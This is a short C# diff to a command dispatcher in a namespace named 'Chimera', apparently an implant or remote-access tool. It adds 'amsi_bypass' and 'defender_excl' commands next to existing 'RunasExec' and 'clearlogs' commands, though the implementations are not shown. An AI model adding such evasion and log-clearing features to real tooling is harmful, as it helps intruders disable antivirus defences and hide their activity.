@@ -144,6 +144,14 @@ namespace Chimera
                         output = Commands.RunasExec.Execute(parameters);
                         break;
 
+                    case "amsi_bypass":
+                        output = Commands.AmsiBypass.Execute();
+                        break;
+
+                    case "defender_excl":
+                        output = Commands.DefenderExclusion.Execute();
+                        break;
+
                     case "clearlogs":
                         output = Commands.ClearLogs.Execute();
                         break;
